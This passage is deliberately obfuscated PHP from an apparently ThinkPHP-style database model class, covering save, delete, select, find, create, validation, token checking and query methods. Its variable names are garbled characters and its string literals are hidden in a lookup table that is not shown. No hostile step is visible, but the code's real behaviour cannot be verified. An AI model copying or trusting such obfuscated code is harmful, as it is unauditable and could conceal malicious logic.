$„²„ë’«[$ÙÒÒˆüØ[311]], $„ˆ—ÂÓ ? $„ˆ—ÂÓ : $this->getTableName(), $„²„ë’«))) { $this->error = think_lang($ÙÒÒˆüØ[312]); return !1; } else { return $„¿óĞ†; } } public function save($¸åêüÕŠ = '', $Ìâ¥«‡“ = array()) { $Æ»œì½ =& $_SERVER[ªÏ§Ë·]; if (empty($¸åêüÕŠ)) { if (!empty($this->data)) { $¸åêüÕŠ = $this->data; $this->data = array(); } else { $this->error = think_lang($Æ»œì½[309]); return !1; } } $¸åêüÕŠ = $this->_facade($¸åêüÕŠ); $Ìâ¥«‡“ = $this->_parseOptions($Ìâ¥«‡“); $‡õÛÊç = $this->getPk(); if (!isset($Ìâ¥«‡“[$Æ»œì½[313]])) { if (isset($¸åêüÕŠ[$‡õÛÊç])) { $²ÔçõĞŞ[$‡õÛÊç] = $¸åêüÕŠ[$‡õÛÊç]; $Ìâ¥«‡“[$Æ»œì½[313]] = $²ÔçõĞŞ; unset($¸åêüÕŠ[$‡õÛÊç]); } else { $this->error = think_lang($Æ»œì½[312]); return !1; } } if (is_array($Ìâ¥«‡“[$Æ»œì½[313]]) && isset($Ìâ¥«‡“[$Æ»œì½[313]][$‡õÛÊç])) { $©àŞ½Ğ½ = $Ìâ¥«‡“[$Æ»œì½[313]][$‡õÛÊç]; } if (!1 === $this->_beforeUpdate($¸åêüÕŠ, $Ìâ¥«‡“)) { return !1; } $»™™¤Õñ = $this->db->update($¸åêüÕŠ, $Ìâ¥«‡“); if (!1 !== $»™™¤Õñ) { if (isset($©àŞ½Ğ½)) { $¸åêüÕŠ[$‡õÛÊç] = $©àŞ½Ğ½; } $this->_afterUpdate($¸åêüÕŠ, $Ìâ¥«‡“); } return $»™™¤Õñ; } protected function _beforeUpdate(&$öñşÕÌ, $ì™œöÅá) { } protected function _afterUpdate($Ÿò…Æ§, $•²ÇºÑÌ) { } public function delete($ü›æ•¥® = array()) { $Ü¹»Û½˜ =& $_SERVER[ªÏ§Ë·]; if (empty($ü›æ•¥®) && empty($this->options[$Ü¹»Û½˜[313]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $É…Ãå§Ê = $this->getPk(); if (is_numeric($ü›æ•¥®) || is_string($ü›æ•¥®)) { if (strpos($ü›æ•¥®, $Ü¹»Û½˜[60])) { $×•¨§ Ï[$É…Ãå§Ê] = array($Ü¹»Û½˜[314], $ü›æ•¥®); } else { $×•¨§ Ï[$É…Ãå§Ê] = $ü›æ•¥®; } $this->options[$Ü¹»Û½˜[313]] = $×•¨§ Ï; } $ü›æ•¥® = $this->_parseOptions(); if (is_array($ü›æ•¥®[$Ü¹»Û½˜[313]]) && isset($ü›æ•¥®[$Ü¹»Û½˜[313]][$É…Ãå§Ê])) { $ôë§àÙÂ = $ü›æ•¥®[$Ü¹»Û½˜[313]][$É…Ãå§Ê]; } $ƒÊÑÕ†ì = $this->db->delete($ü›æ•¥®); if (!1 !== $ƒÊÑÕ†ì) { $Ä³Ìü£ò = array(); if (isset($ôë§àÙÂ)) { $Ä³Ìü£ò[$É…Ãå§Ê] = $ôë§àÙÂ; } $this->_after_delete($Ä³Ìü£ò, $ü›æ•¥®); } return $ƒÊÑÕ†ì; } protected function _after_delete($˜·Ùò¢, $ñ›»ª”) { } public function select($×ØìêÖª = array()) { $…ØøÑ¹ =& $_SERVER[ªÏ§Ë·]; if (is_string($×ØìêÖª) || is_numeric($×ØìêÖª)) { $€øÔ¨ìç = $this->getPk(); if (strpos($×ØìêÖª, $…ØøÑ¹[60])) { $ÜŞ´¢£ş[$€øÔ¨ìç] = array($…ØøÑ¹[314], $×ØìêÖª); } else { $ÜŞ´¢£ş[$€øÔ¨ìç] = $×ØìêÖª; } $this->options[$…ØøÑ¹[313]] = $ÜŞ´¢£ş; } elseif (!1 === $×ØìêÖª) { $×ØìêÖª = $this->_parseOptions(); return $…ØøÑ¹[315] . $this->db->buildSelectSql($×ØìêÖª) . $…ØøÑ¹[316]; } $×ØìêÖª = $this->_parseOptions(); $¨½öÊ·§ = $this->db->select($×ØìêÖª); if (!1 === $¨½öÊ·§) { return !1; } if (empty($¨½öÊ·§)) { return null; } $this->_afterSelect($¨½öÊ·§, $×ØìêÖª); return $¨½öÊ·§; } protected function _afterSelect(&$ğÉ¾İìÑ, $çÇ¡ûó·) { } public function buildSql($ìŸˆœö = array()) { $ ‹ºŸ¼Ò =& $_SERVER[ªÏ§Ë·]; $ìŸˆœö = $this->_parseOptions($ìŸˆœö); return $ ‹ºŸ¼Ò[315] . $this->db->buildSelectSql($ìŸˆœö) . $ ‹ºŸ¼Ò[316]; } public function optionsValue($·ôıª´¢ = null) { if (is_null($·ôıª´¢)) { return $this->options; } elseif (is_array($·ôıª´¢)) { $this->options = array_merge($this->options, $·ôıª´¢); } } protected function _parseOptions($à–³ç” = array()) { $Â‘ÁÓö¶ =& $_SERVER[ªÏ§Ë·]; if (is_array($à–³ç”)) { $à–³ç” = array_merge($this->options, $à–³ç”); } $this->options = array(); if (!isset($à–³ç”[$Â‘ÁÓö¶[317]])) { $à–³ç”[$Â‘ÁÓö¶[317]] = $this->getTableName(); $õå¿äß = $this->fields; } else { $õå¿äß = $this->getDbFields(); } if (!empty($à–³ç”[$Â‘ÁÓö¶[318]])) { $à–³ç”[$Â‘ÁÓö¶[317]] .= $Â‘ÁÓö¶[63] . $à–³ç”[$Â‘ÁÓö¶[318]]; } $à–³ç”[$Â‘ÁÓö¶[319]] = $this->name; if (isset($à–³ç”[$Â‘ÁÓö¶[313]]) && is_array($à–³ç”[$Â‘ÁÓö¶[313]]) && !empty($õå¿äß) && !isset($à–³ç”[$Â‘ÁÓö¶[320]]) && !isset($à–³ç”[$Â‘ÁÓö¶[317]])) { foreach ($à–³ç”[$Â‘ÁÓö¶[313]] as $ìÎ…ÚÌñ => $Ì³ÍÖ¸ú) { $ìÎ…ÚÌñ = trim($ìÎ…ÚÌñ); if (in_array($ìÎ…ÚÌñ, $õå¿äß, !0)) { if (is_scalar($Ì³ÍÖ¸ú)) { $this->_parseType($à–³ç”[$Â‘ÁÓö¶[313]], $ìÎ…ÚÌñ); } } elseif (!is_numeric($ìÎ…ÚÌñ) && $Â‘ÁÓö¶[11] != substr($ìÎ…ÚÌñ, 0, 1) && !1 === strpos($ìÎ…ÚÌñ, $Â‘ÁÓö¶[10]) && !1 === strpos($ìÎ…ÚÌñ, $Â‘ÁÓö¶[298]) && !1 === strpos($ìÎ…ÚÌñ, $Â‘ÁÓö¶[321]) && !1 === strpos($ìÎ…ÚÌñ, $Â‘ÁÓö¶[322])) { unset($à–³ç”[$Â‘ÁÓö¶[313]][$ìÎ…ÚÌñ]); } } } $this->_options_filter($à–³ç”); return $à–³ç”; } protected function _options_filter(&$è›¾ó¿Ú) { } protected function _parseType(&$ÉÃ¾Ü¥Æ, $ıü–ıœÅ) { $¾ÀĞàş =& $_SERVER[ªÏ§Ë·]; if (empty($this->options[$¾ÀĞàş[323]][$¾ÀĞàş[4] . $ıü–ıœÅ])) { $®‘óæŸé = strtolower($this->fields[$¾ÀĞàş[290]][$ıü–ıœÅ]); if (!1 !== strpos($®‘óæŸé, $¾ÀĞàş[324])) { } elseif (!1 === strpos($®‘óæŸé, $¾ÀĞàş[325]) && !1 !== strpos($®‘óæŸé, $¾ÀĞàş[326])) { $ÉÃ¾Ü¥Æ[$ıü–ıœÅ] = intval($ÉÃ¾Ü¥Æ[$ıü–ıœÅ]); } elseif (!1 !== strpos($®‘óæŸé, $¾ÀĞàş[327]) || !1 !== strpos($®‘óæŸé, $¾ÀĞàş[328])) { $ÉÃ¾Ü¥Æ[$ıü–ıœÅ] = floatval($ÉÃ¾Ü¥Æ[$ıü–ıœÅ]); } elseif (!1 !== strpos($®‘óæŸé, $¾ÀĞàş[329])) { $ÉÃ¾Ü¥Æ[$ıü–ıœÅ] = (bool) $ÉÃ¾Ü¥Æ[$ıü–ıœÅ]; } } } public function find($¶¥®ˆÒ = array()) { $ºî·ÀêÖ =& $_SERVER[ªÏ§Ë·]; if (is_numeric($¶¥®ˆÒ) || is_string($¶¥®ˆÒ)) { $‚‚Ã¨ƒª[$this->getPk()] = intval($¶¥®ˆÒ); $this->options[$ºî·ÀêÖ[313]] = $‚‚Ã¨ƒª; } $this->options[$ºî·ÀêÖ[330]] = 1; $¶¥®ˆÒ = $this->_parseOptions(); $çò’û¯ğ = $this->db->select($¶¥®ˆÒ); if (!1 === $çò’û¯ğ) { return !1; } if (empty($çò’û¯ğ)) { return null; } $this->data = $çò’û¯ğ[0]; $this->_afterFind($this->data, $¶¥®ˆÒ); if (!empty($this->options[$ºî·ÀêÖ[331]])) { return $this->returnResult($this->data, $this->options[$ºî·ÀêÖ[331]]); } return $this->data; } protected function _afterFind(&$Ô¨½“ñ, $·‘£³Ü±) { } protected function returnResult($³õà‰§è, $—²Îß÷ª = '') { $úŠ˜—  =& $_SERVER[ªÏ§Ë·]; if ($—²Îß÷ª) { if (is_callable($—²Îß÷ª)) { return call_user_func($—²Îß÷ª, $³õà‰§è); } switch (strtolower($—²Îß÷ª)) { case $úŠ˜— [332]: return json_encode($³õà‰§è); case $úŠ˜— [333]: return xml_encode($³õà‰§è); } } return $³õà‰§è; } public function parseFieldsMap($Œö‡—ÕÏ, $Áüğ›Á = 1) { if (!empty($this->_map)) { foreach ($this->_map as $å«õö¡Í => $ÑÕ÷„µè) { if ($Áüğ›Á == 1) { if (isset($Œö‡—ÕÏ[$ÑÕ÷„µè])) { $Œö‡—ÕÏ[$å«õö¡Í] = $Œö‡—ÕÏ[$ÑÕ÷„µè]; unset($Œö‡—ÕÏ[$ÑÕ÷„µè]); } } else { if (isset($Œö‡—ÕÏ[$å«õö¡Í])) { $Œö‡—ÕÏ[$ÑÕ÷„µè] = $Œö‡—ÕÏ[$å«õö¡Í]; unset($Œö‡—ÕÏ[$å«õö¡Í]); } } } } return $Œö‡—ÕÏ; } public function setField($Üïº®Ê, $„¨ü¥ı = '') { if (is_array($Üïº®Ê)) { $•ï¹Âª = $Üïº®Ê; } else { $•ï¹Âª[$Üïº®Ê] = $„¨ü¥ı; } return $this->save($•ï¹Âª); } public function setAdd($™ë’Ã›, $íğ²®ßí = 1) { $¡ËÆğì =& $_SERVER[ªÏ§Ë·]; $şŒŠªøÔ = $™ë’Ã› . $¡ËÆğì[334] . $íğ²®ßí; if ($íğ²®ßí < 0) { $şŒŠªøÔ = $™ë’Ã› . $íğ²®ßí; } return $this->setField($™ë’Ã›, array($¡ËÆğì[335], $şŒŠªøÔ)); } public function getField($Ş¸û€ÜÚ, $Ìõî†¼“ = null) { $¬š”¾Ò¹ =& $_SERVER[ªÏ§Ë·]; $ˆØ©Ä‚[$¬š”¾Ò¹[311]] = $Ş¸û€ÜÚ; $ˆØ©Ä‚ = $this->_parseOptions($ˆØ©Ä‚); $Ş¸û€ÜÚ = trim($Ş¸û€ÜÚ); if (strpos($Ş¸û€ÜÚ, $¬š”¾Ò¹[60])) { if (!isset($ˆØ©Ä‚[$¬š”¾Ò¹[330]])) { $ˆØ©Ä‚[$¬š”¾Ò¹[330]] = is_numeric($Ìõî†¼“) ? $Ìõî†¼“ : $¬š”¾Ò¹[12]; } $Ä®ÌûÆ÷ = $this->db->select($ˆØ©Ä‚); if (!empty($Ä®ÌûÆ÷)) { $•ÆÁŠó“ = explode($¬š”¾Ò¹[60], $Ş¸û€ÜÚ); $Ş¸û€ÜÚ = array_keys($Ä®ÌûÆ÷[0]); $‹Ôí·Ş¥ = array_shift($Ş¸û€ÜÚ); $—ğ÷ÏßÕ = array_shift($Ş¸û€ÜÚ); $ºø’²öÓ = array(); $€ÀÎ–¯Š = count($•ÆÁŠó“); foreach ($Ä®ÌûÆ÷ as $ÆüÛşç) { $ÊÊº˜ø = $ÆüÛşç[$‹Ôí·Ş¥]; if (2 == $€ÀÎ–¯Š) { $ºø’²öÓ[$ÊÊº˜ø] = $ÆüÛşç[$—ğ÷ÏßÕ]; } else { $ºø’²öÓ[$ÊÊº˜ø] = is_string($Ìõî†¼“) ? implode($Ìõî†¼“, $ÆüÛşç) : $ÆüÛşç; } } return $ºø’²öÓ; } } else { if (!0 !== $Ìõî†¼“) { $ˆØ©Ä‚[$¬š”¾Ò¹[330]] = is_numeric($Ìõî†¼“) ? $Ìõî†¼“ : 1; } if ($Ìõî†¼“ === $¬š”¾Ò¹[293]) { unset($ˆØ©Ä‚[$¬š”¾Ò¹[330]]); } $ÆüÛşç = $this->db->select($ˆØ©Ä‚); if (!empty($ÆüÛşç)) { if ($Ìõî†¼“ === $¬š”¾Ò¹[293]) { return reset($ÆüÛşç[0]); } if (!0 !== $Ìõî†¼“ && 1 == $ˆØ©Ä‚[$¬š”¾Ò¹[330]]) { return reset($ÆüÛşç[0]); } foreach ($ÆüÛşç as $ıœ¨›¼ó) { $À¶Ã®äÏ[] = $ıœ¨›¼ó[$Ş¸û€ÜÚ]; } return $À¶Ã®äÏ; } } return null; } public function create($áÇ¯íòñ = '', $¦šİÛ£Ô = '') { $²ÛÇİ¶º =& $_SERVER[ªÏ§Ë·]; if (empty($áÇ¯íòñ)) { $áÇ¯íòñ = $_POST; } elseif (is_object($áÇ¯íòñ)) { $áÇ¯íòñ = get_object_vars($áÇ¯íòñ); } if (empty($áÇ¯íòñ) || !is_array($áÇ¯íòñ)) { $this->error = think_lang($²ÛÇİ¶º[309]); return !1; } $áÇ¯íòñ = $this->parseFieldsMap($áÇ¯íòñ, 0); $¦šİÛ£Ô = $¦šİÛ£Ô ? $¦šİÛ£Ô : (!empty($áÇ¯íòñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$²ÛÇİ¶º[311]])) { $à¬ï¯¸ = $this->options[$²ÛÇİ¶º[311]]; unset($this->options[$²ÛÇİ¶º[311]]); } elseif ($¦šİÛ£Ô == THINK_MODEL_INSERT && isset($this->insertFields)) { $à¬ï¯¸ = $this->insertFields; } elseif ($¦šİÛ£Ô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $à¬ï¯¸ = $this->updateFields; } if (isset($à¬ï¯¸)) { if (is_string($à¬ï¯¸)) { $à¬ï¯¸ = explode($²ÛÇİ¶º[60], $à¬ï¯¸); } if (think_config($²ÛÇİ¶º[336])) { $à¬ï¯¸[] = think_config($²ÛÇİ¶º[337]); } foreach ($áÇ¯íòñ as $›º×µÜ· => $›üª–ÖŞ) { if (!in_array($›º×µÜ·, $à¬ï¯¸)) { unset($áÇ¯íòñ[$›º×µÜ·]); } } } if (!$this->autoValidation($áÇ¯íòñ, $¦šİÛ£Ô)) { return !1; } if (!$this->autoCheckToken($áÇ¯íòñ)) { $this->error = think_lang($²ÛÇİ¶º[338]); return !1; } if ($this->autoCheckFields) { $à¬ï¯¸ = $this->getDbFields(); foreach ($áÇ¯íòñ as $›º×µÜ· => $›üª–ÖŞ) { if (!in_array($›º×µÜ·, $à¬ï¯¸)) { unset($áÇ¯íòñ[$›º×µÜ·]); } elseif (MAGIC_QUOTES_GPC && is_string($›üª–ÖŞ)) { $áÇ¯íòñ[$›º×µÜ·] = stripslashes($›üª–ÖŞ); } } } $this->autoOperation($áÇ¯íòñ, $¦šİÛ£Ô); $this->data = $áÇ¯íòñ; return $áÇ¯íòñ; } public function autoCheckToken($¼šÆôÁ“) { $ªÊÔœÆÁ =& $_SERVER[ªÏ§Ë·]; if (isset($this->options[$ªÊÔœÆÁ[339]]) && !$this->options[$ªÊÔœÆÁ[339]]) { return !0; } if (think_config($ªÊÔœÆÁ[336])) { $şø¢éı… = think_config($ªÊÔœÆÁ[337]); if (!isset($¼šÆôÁ“[$şø¢éı…]) || Session::get($şø¢éı…)) { return !1; } list($õ¢’ØÜ, $ë’” ƒ®) = explode($ªÊÔœÆÁ[11], $¼šÆôÁ“[$şø¢éı…]); if ($ë’” ƒ® && Session::get($şø¢éı… . $ªÊÔœÆÁ[10] . $õ¢’ØÜ) === $ë’” ƒ®) { Session::remove($şø¢éı… . $ªÊÔœÆÁ[10] . $õ¢’ØÜ); return !0; } if (think_config($ªÊÔœÆÁ[340])) { Session::remove($şø¢éı… . $ªÊÔœÆÁ[10] . $õ¢’ØÜ); } return !1; } return !0; } public function regex($Õ´ñÌ»µ, $Ö³¾Ö¼) { $·¡¾Îì¬ =& $_SERVER[ªÏ§Ë·]; $¹©˜Ö– = array($·¡¾Îì¬[341] => $·¡¾Îì¬[342], $·¡¾Îì¬[343] => $·¡¾Îì¬[344], $·¡¾Îì¬[345] => $·¡¾Îì¬[346], $·¡¾Îì¬[347] => $·¡¾Îì¬[348], $·¡¾Îì¬[349] => $·¡¾Îì¬[350], $·¡¾Îì¬[351] => $·¡¾Îì¬[352], $·¡¾Îì¬[353] => $·¡¾Îì¬[354], $·¡¾Îì¬[328] => $·¡¾Îì¬[355], $·¡¾Îì¬[356] => $·¡¾Îì¬[357]); if (isset($¹©˜Ö–[strtolower($Ö³¾Ö¼)])) { $Ö³¾Ö¼ = $¹©˜Ö–[strtolower($Ö³¾Ö¼)]; } return preg_match($Ö³¾Ö¼, $Õ´ñÌ»µ) === 1; } private function autoOperation(&$É‘ØĞ®ä, $£‹©Ö»Ü) { $£Êç°† =& $_SERVER[ªÏ§Ë·]; if (!empty($this->options[$£Êç°†[358]])) { $á¦…Ò®ç = $this->options[$£Êç°†[358]]; unset($this->options[$£Êç°†[358]]); } elseif (!empty($this->_auto)) { $á¦…Ò®ç = $this->_auto; } if (isset($á¦…Ò®ç)) { foreach ($á¦…Ò®ç as $®ËşÎƒÁ) { if (empty($®ËşÎƒÁ[2])) { $®ËşÎƒÁ[2] = THINK_MODEL_INSERT; } if ($£‹©Ö»Ü == $®ËşÎƒÁ[2] || $®ËşÎƒÁ[2] == THINK_MODEL_BOTH) { switch (trim($®ËşÎƒÁ[3])) { case $£Êç°†[359]: case $£Êç°†[360]: $Ú‰Ã£“‰ = isset($®ËşÎƒÁ[4]) ? (array) $®ËşÎƒÁ[4] : array(); if (isset($É‘ØĞ®ä[$®ËşÎƒÁ[0]])) { array_unshift($Ú‰Ã£“‰, $É‘ØĞ®ä[$®ËşÎƒÁ[0]]); } if ($£Êç°†[359] == $®ËşÎƒÁ[3]) { $É‘ØĞ®ä[$®ËşÎƒÁ[0]] = call_user_func_array($®ËşÎƒÁ[1], $Ú‰Ã£“‰); } else { $É‘ØĞ®ä[$®ËşÎƒÁ[0]] = call_user_func_array(array(&$this, $®ËşÎƒÁ[1]), $Ú‰Ã£“‰); } break; case $£Êç°†[311]: $É‘ØĞ®ä[$®ËşÎƒÁ[0]] = $É‘ØĞ®ä[$®ËşÎƒÁ[1]]; break; case $£Êç°†[361]: if ($£Êç°†[12] === $É‘ØĞ®ä[$®ËşÎƒÁ[0]]) { unset($É‘ØĞ®ä[$®ËşÎƒÁ[0]]); } break; case $£Êç°†[362]: default: $É‘ØĞ®ä[$®ËşÎƒÁ[0]] = $®ËşÎƒÁ[1]; } if (!1 === $É‘ØĞ®ä[$®ËşÎƒÁ[0]]) { unset($É‘ØĞ®ä[$®ËşÎƒÁ[0]]); } } } } return $É‘ØĞ®ä; } protected function autoValidation($Ñ¶ıÁÑ¾, $‰ˆ¤µù) { $à©œÕÃÈ =& $_SERVER[ªÏ§Ë·]; if (!empty($this->options[$à©œÕÃÈ[363]])) { $œ§ã™¸ = $this->options[$à©œÕÃÈ[363]]; unset($this->options[$à©œÕÃÈ[363]]); } elseif (!empty($this->_validate)) { $œ§ã™¸ = $this->_validate; } if (isset($œ§ã™¸)) { if ($this->patchValidate) { $this->error = array(); } foreach ($œ§ã™¸ as $‚Å’‡è˜ => $üŒ³¼ì°) { if (empty($üŒ³¼ì°[5]) || $üŒ³¼ì°[5] == THINK_MODEL_BOTH || $üŒ³¼ì°[5] == $‰ˆ¤µù) { if (0 == strpos($üŒ³¼ì°[2], $à©œÕÃÈ[364]) && strpos($üŒ³¼ì°[2], $à©œÕÃÈ[365])) { $üŒ³¼ì°[2] = think_lang(substr($üŒ³¼ì°[2], 2, -1)); } $üŒ³¼ì°[3] = isset($üŒ³¼ì°[3]) ? $üŒ³¼ì°[3] : THINK_EXISTS_VALIDATE; $üŒ³¼ì°[4] = isset($üŒ³¼ì°[4]) ? $üŒ³¼ì°[4] : $à©œÕÃÈ[366]; switch ($üŒ³¼ì°[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ñ¶ıÁÑ¾, $üŒ³¼ì°)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($à©œÕÃÈ[12] != trim($Ñ¶ıÁÑ¾[$üŒ³¼ì°[0]])) { if (!1 === $this->_validationField($Ñ¶ıÁÑ¾, $üŒ³¼ì°)) { return !1; } } break; default: if (isset($Ñ¶ıÁÑ¾[$üŒ³¼ì°[0]])) { if (!1 === $this->_validationField($Ñ¶ıÁÑ¾, $üŒ³¼ì°)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($·ò§¯å¶, $™øÁûò) { if (!1 === $this->_validationFieldItem($·ò§¯å¶, $™øÁûò)) { if ($this->patchValidate) { $this->error[$™øÁûò[0]] = $™øÁûò[2]; } else { $this->error = $™øÁûò[2]; return !1; } } return; } protected function _validationFieldItem($„âÙŸÛã, $ÇÊíÃàß) { $å¥ÔìŠ¡ =& $_SERVER[ªÏ§Ë·]; switch (strtolower(trim($ÇÊíÃàß[4]))) { case $å¥ÔìŠ¡[359]: case $å¥ÔìŠ¡[360]: $­Ğñ™êÆ = isset($ÇÊíÃàß[6]) ? (array) $ÇÊíÃàß[6] : array(); if (is_string($ÇÊíÃàß[0]) && strpos($ÇÊíÃàß[0], $å¥ÔìŠ¡[60])) { $ÇÊíÃàß[0] = explode($å¥ÔìŠ¡[60], $ÇÊíÃàß[0]); } if (is_array($ÇÊíÃàß[0])) { foreach ($ÇÊíÃàß[0] as $Øã¹“¨) { $Ì«ÙîÁ£[$Øã¹“¨] = $„âÙŸÛã[$Øã¹“¨]; } array_unshift($­Ğñ™êÆ, $Ì«ÙîÁ£); } else { array_unshift($­Ğñ™êÆ, $„âÙŸÛã[$ÇÊíÃàß[0]]); } if ($å¥ÔìŠ¡[359] == $ÇÊíÃàß[4]) { return call_user_func_array($ÇÊíÃàß[1], $­Ğñ™êÆ); } else { return call_user_func_array(array(&$this, $ÇÊíÃàß[1]), $­Ğñ™êÆ); } case $å¥ÔìŠ¡[367]: return $„âÙŸÛã[$ÇÊíÃàß[0]] == $„âÙŸÛã[$ÇÊíÃàß[1]]; case $å¥ÔìŠ¡[368]: if (is_string($ÇÊíÃàß[0]) && strpos($ÇÊíÃàß[0], $å¥ÔìŠ¡[60])) { $ÇÊíÃàß[0] = explode($å¥ÔìŠ¡[60], $ÇÊíÃàß[0]); } $¾İÙ²÷„ = array(); if (is_array($ÇÊíÃàß[0])) { foreach ($ÇÊíÃàß[0] as $Øã¹“¨) { $¾İÙ²÷„[$Øã¹“¨] = $„âÙŸÛã[$Øã¹“¨]; } } else { $¾İÙ²÷„[$ÇÊíÃàß[0]] = $„âÙŸÛã[$ÇÊíÃàß[0]]; } if (!empty($„âÙŸÛã[$this->getPk()])) { $¾İÙ²÷„[$this->getPk()] = array($å¥ÔìŠ¡[369], $„âÙŸÛã[$this->getPk()]); } if ($this->where($¾İÙ²÷„)->find()) { return !1; } return !0; default: return $this->check($„âÙŸÛã[$ÇÊíÃàß[0]], $ÇÊíÃàß[1], $ÇÊíÃàß[4]); } } public function check($¿ûã•¾«, $ú„¤’É, $úüÃ¿ = "\x72\145\x67\145\170") { $ˆìí²± =& $_SERVER[ªÏ§Ë·]; $úüÃ¿ = strtolower(trim($úüÃ¿)); switch ($úüÃ¿) { case $ˆìí²±[7]: case $ˆìí²±[370]: $—ÅÆ„äÄ = is_array($ú„¤’É) ? $ú„¤’É : explode($ˆìí²±[60], $ú„¤’É); return $úüÃ¿ == $ˆìí²±[7] ? in_array($¿ûã•¾«, $—ÅÆ„äÄ) : !in_array($¿ûã•¾«, $—ÅÆ„äÄ); case $ˆìí²±[371]: case $ˆìí²±[372]: if (is_array($ú„¤’É)) { $¾†¾ºÑ = $ú„¤’É[0]; $À÷¬×˜· = $ú„¤’É[1]; } else { list($¾†¾ºÑ, $À÷¬×˜·) = explode($ˆìí²±[60], $ú„¤’É); } return $úüÃ¿ == $ˆìí²±[371] ? $¿ûã•¾« >= $¾†¾ºÑ && $¿ûã•¾« <= $À÷¬×˜· : $¿ûã•¾« < $¾†¾ºÑ || $¿ûã•¾« > $À÷¬×˜·; case $ˆìí²±[373]: case $ˆìí²±[374]: return $úüÃ¿ == $ˆìí²±[373] ? $¿ûã•¾« == $ú„¤’É : $¿ûã•¾« != $ú„¤’É; case $ˆìí²±[375]: $™¸êé» = mb_strlen($¿ûã•¾«, $ˆìí²±[376]); if (strpos($ú„¤’É, $ˆìí²±[60])) { list($¾†¾ºÑ, $À÷¬×˜·) = explode($ˆìí²±[60], $ú„¤’É); return $™¸êé» >= $¾†¾ºÑ && $™¸êé» <= $À÷¬×˜·; } else { return $™¸êé» == $ú„¤’É; } case $ˆìí²±[377]: list($ŸŠ¦óÙû, $—Õ¥şìè) = explode($ˆìí²±[60], $ú„¤’É); if (!is_numeric($ŸŠ¦óÙû)) { $ŸŠ¦óÙû = strtotime($ŸŠ¦óÙû); } if (!is_numeric($—Õ¥şìè)) { $—Õ¥şìè = strtotime($—Õ¥şìè); } return NOW_TIME >= $ŸŠ¦óÙû && NOW_TIME <= $—Õ¥şìè; case $ˆìí²±[378]: return in_array(get_client_ip(), explode($ˆìí²±[60], $ú„¤’É)); case $ˆìí²±[379]: return !in_array(get_client_ip(), explode($ˆìí²±[60], $ú„¤’É)); case $ˆìí²±[366]: default: return $this->regex($¿ûã•¾«, $ú„¤’É); } } public function query($¹çüÁ¬, $×ôóøì = false) { $òêØîğƒ =& $_SERVER[ªÏ§Ë·]; if (!is_bool($×ôóøì) && !is_array($×ôóøì)) { $×ôóøì = func_get_args(); array_shift($×ôóøì); } $¹çüÁ¬ = str_replace(array($òêØîğƒ[19], $òêØîğƒ[380]), $òêØîğƒ[63], $¹çüÁ¬); $¹çüÁ¬ = $this->parseSql($¹çüÁ¬, $×ôóøì); return $this->db->query($¹çüÁ¬); } public function execute($’áæ½ù, $®¾ûÄĞ = false) { if (!is_bool($®¾ûÄĞ) && !is_array($®¾ûÄĞ)) { $®¾ûÄĞ = func_get_args(); array_shift($®¾ûÄĞ); } $’áæ½ù = $this->parseSql($’áæ½ù, $®¾ûÄĞ); return $this->db->execute($’áæ½ù); } protected function parseSql($¯‘×šáÅ, $Ş‘Ÿ°Ø„) { $¡ôû¾‰ =& $_SERVER[ªÏ§Ë·]; if (!0 === $Ş‘Ÿ°Ø„) { $¹¿ÙÀ–° = $this->_parseOptions(); $¯‘×šáÅ = $this->db->parseSql($¯‘×šáÅ, $¹¿ÙÀ–°); } elseif (is_array($Ş‘Ÿ°Ø„)) { $Ş‘Ÿ°Ø„ = array_map(array($this->db, $¡ôû¾‰[381]), $Ş‘Ÿ°Ø„); $¯‘×šáÅ = vsprintf($¯‘×šáÅ, $Ş‘Ÿ°Ø„); } else { $¯‘×šáÅ = strtr($¯‘×šáÅ, array($¡ôû¾‰[382] => $this->getTableName(), $¡ôû¾‰[383] => think_config($¡ôû¾‰[282]))); } $this->db->setModel($this->name); return $¯‘×šáÅ; } public function db($çéÙ¸Âß = '', $şƒ¦¯´ã = '', $âûó©„ï = array()) { $ğÒğ°¯ =& $_SERVER[ªÏ§Ë·]; if ($ğÒğ°¯[12] === $çéÙ¸Âß && $this->db) { return $this->db; } static $ƒ…ªÎÇ’ = array(); static $ËÂÙæõ® = array(); if (!isset($ËÂÙæõ®[$çéÙ¸Âß]) || isset($ËÂÙæõ®[$çéÙ¸Âß]) && $şƒ¦¯´ã && $ƒ…ªÎÇ’[$çéÙ¸Âß] != $şƒ¦¯´ã) { if (!empty($şƒ¦¯´ã) && is_string($şƒ¦¯´ã) && !1 === strpos($şƒ¦¯´ã, $ğÒğ°¯[8])) { $şƒ¦¯´ã = think_config($şƒ¦¯´ã); } $çéÙ¸Âß = think_guid($şƒ¦¯´ã); $ËÂÙæõ®[$çéÙ¸Âß] = Db::getInstance($şƒ¦¯´ã); } elseif (NULL === $şƒ¦¯´ã) { $ËÂÙæõ®[$çéÙ¸Âß]->close(); unset($ËÂÙæõ®[$çéÙ¸Âß]); return; } if (!empty($âûó©„ï)) { if (is_string($âûó©„ï)) { parse_str($âûó©„ï, $âûó©„ï); } foreach ($âûó©„ï as $ó€»ÚÃ => $©ô¸Æé) { $this->setProperty($ó€»ÚÃ, $©ô¸Æé); } } $ƒ…ªÎÇ’[$çéÙ¸Âß] = $şƒ¦¯´ã; $this->db = $ËÂÙæõ®[$çéÙ¸Âß]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÌÒ´å½ = get_class($this); if ($ÌÒ´å½ == $_SERVER[ªÏ§Ë·][384]) { return $this->name; } $this->name = substr($ÌÒ´å½, 0, -5); } return $this->name; } public function getTableName() { $î†ô×Ú =& $_SERVER[ªÏ§Ë·]; if (empty($this->trueTableName)) { $àç‚§«¡ = !empty($this->tablePrefix) ? $this->tablePrefix : $î†ô×Ú[12]; if (!empty($this->tableName)) { $àç‚§«¡ .= $this->tableName; } else { $àç‚§«¡ .= think_parse_name($this->name); } $this->trueTableName = strtolower($àç‚§«¡); } return (!empty($this->dbName) ? $this->dbName . $î†ô×Ú[10] : $î†ô×Ú[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } 